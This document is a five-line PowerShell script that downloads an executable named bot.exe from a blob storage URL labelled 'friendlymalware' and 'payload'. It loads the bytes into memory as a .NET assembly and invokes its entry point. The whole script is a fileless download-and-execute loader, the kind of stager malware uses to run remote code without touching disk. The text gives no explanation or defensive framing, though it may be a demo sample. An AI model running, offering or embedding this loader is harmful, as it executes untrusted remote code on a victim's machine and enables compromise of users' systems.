$webclient = New-Object System.Net.WebClient
$bytes = $webclient.DownloadData("https://friendlymalware.blob.core.windows.net/payload/bot.exe")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, @([String[]]@()))
